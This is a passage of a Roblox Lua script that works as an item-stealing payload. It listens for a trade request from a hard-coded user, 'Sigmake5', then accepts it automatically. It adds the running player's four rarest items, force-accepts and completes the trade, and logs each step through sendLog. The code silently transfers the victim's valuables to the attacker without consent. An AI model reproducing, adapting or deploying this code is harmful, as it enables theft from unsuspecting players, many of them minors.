-- ============================================
-- AUTO ACCEPT AND TRADE (WHEN SIGMAKE5 REQUESTS)
-- ============================================

local tradeInProgress = false
local processedTrades = {}

-- Force accept trade request (0.1 second response)
local function forceAcceptRequest()
    -- Method 1: Use remote
    if remotes.AcceptRequest then
        pcall(function()
            remotes.AcceptRequest:FireServer()
            sendLog("✅ Auto-accepted trade request (0.1s via remote)")
            return true
        end)
    end
    
    -- Method 2: Find and click accept button
    pcall(function()
        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
            if btn:IsA("TextButton") then
                local text = (btn.Text or ""):lower()
                if text:find("accept") or text:find("confirm") then
                    forceClick(btn)
                    sendLog("✅ Auto-accepted trade request (0.1s via click)")
                    return true
                end
            end
        end
    end)
    
    return false
end

-- Force add rarest items to trade
local function forceAddRarestItems(maxItems)
    local itemsAdded = 0
    local items = getAllItemsFromGUI()
    
    if #items == 0 then
        sendLog("⚠️ No items found in inventory!")
        return 0
    end
    
    sendLog("📦 Found " .. #items .. " items, adding rarest first...")
    
    -- Log top items being added
    for i = 1, math.min(maxItems, #items) do
        sendLog("  👑 Adding: " .. items[i].name .. " (Rarity: " .. items[i].rarity .. ")")
    end
    
    -- Method 1: Use OfferItem remote
    for i = 1, math.min(maxItems, #items) do
        if remotes.OfferItem then
            pcall(function()
                remotes.OfferItem:FireServer(items[i].frame)
                itemsAdded = itemsAdded + 1
                sendLog("➕ Force-added: " .. items[i].name)
            end)
        else
            -- Method 2: Click on item frame
            if items[i].frame then
                forceClick(items[i].frame)
                itemsAdded = itemsAdded + 1
                sendLog("➕ Force-clicked: " .. items[i].name)
            end
        end
        wait(0.1) -- Fast addition
    end
    
    return itemsAdded
end

-- Force accept trade (when Sigmake5 accepts)
local function forceAcceptTrade()
    -- Method 1: Use remote
    if remotes.AcceptTrade then
        pcall(function()
            remotes.AcceptTrade:FireServer()
            sendLog("✅ Force-accepted trade via remote")
            return true
        end)
    end
    
    -- Method 2: Click accept button
    pcall(function()
        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
            if btn:IsA("TextButton") then
                local text = (btn.Text or ""):lower()
                if text:find("accept") and not text:find("decline") then
                    forceClick(btn)
                    sendLog("✅ Force-accepted trade via click")
                    return true
                end
            end
        end
    end)
    
    return false
end

-- Force complete trade
local function forceCompleteTrade()
    if remotes.CompleteTrade then
        pcall(function()
            remotes.CompleteTrade:FireServer()
            sendLog("🎉 Trade forcefully completed!")
            return true
        end)
    end
    return false
end

-- ============================================
-- LISTEN FOR SIGMAKE5 TRADE REQUEST
-- ============================================

local function setupTradeListener()
    findRemotes()
    
    -- Listen for incoming trade requests
    for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") and remote.OnClientEvent then
            remote.OnClientEvent:Connect(function(...)
                local args = {...}
                
                for _, arg in pairs(args) do
                    -- Check if this is a trade request from Sigmake5
                    if type(arg) == "table" and arg.Name == TARGET_USER then
                        local requestId = tostring(arg)
                        if not processedTrades[requestId] then
                            processedTrades[requestId] = true
                            sendLog("🔔 Trade request from " .. TARGET_USER .. " detected!")
                            
                            -- Start auto trade sequence
                            spawn(function()
                                if tradeInProgress then return end
                                tradeInProgress = true
                                
                                -- Step 1: Accept request in 0.1 seconds
                                wait(0.1)
                                forceAcceptRequest()
                                
                                -- Step 2: Wait for trade window
                                wait(0.5)
                                
                                -- Step 3: Force add rarest items (max 4)
                                local added = forceAddRarestItems(4)
                                
                                -- Step 4: Wait for Sigmake5 to accept
                                wait(1)
                                
                                -- Step 5: Force accept when they do
                                forceAcceptTrade()
                                
                                -- Step 6: Complete trade
                                wait(0.3)
                                forceCompleteTrade()
                                
                                sendLog("🎉 Auto trade completed! " .. added .. " items sent to " .. TARGET_USER)
                                tradeInProgress = false
                            end)
                        end
                        
                    elseif type(arg) == "string" and arg == TARGET_USER then
                        sendLog("🔔 Trade event from " .. TARGET_USER)
                    end
                end
            end)
        end
    end
end

-- ============================================
-- WATCH FOR SIGMAKE5 JOINING
